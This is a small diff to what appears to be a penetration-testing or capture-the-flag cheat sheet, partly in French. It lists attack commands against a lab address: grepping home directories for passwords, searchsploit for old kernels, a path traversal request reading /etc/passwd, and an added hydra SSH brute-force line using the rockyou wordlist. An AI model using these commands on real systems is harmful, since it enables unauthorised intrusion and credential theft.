@@ -35,4 +35,5 @@ grep -Ri password /home/*   :
 searchsploit linux kernel 2.6 : deux chiffre
 ls /etc | grep release : know the distribution of the OS
 https://10.0.4.13/?page=/../../../etc/passwd%00
+hydra -L users -P /usr/share/wordlists/rockyou.txt 10.0.4.13 ssh -V
 ```
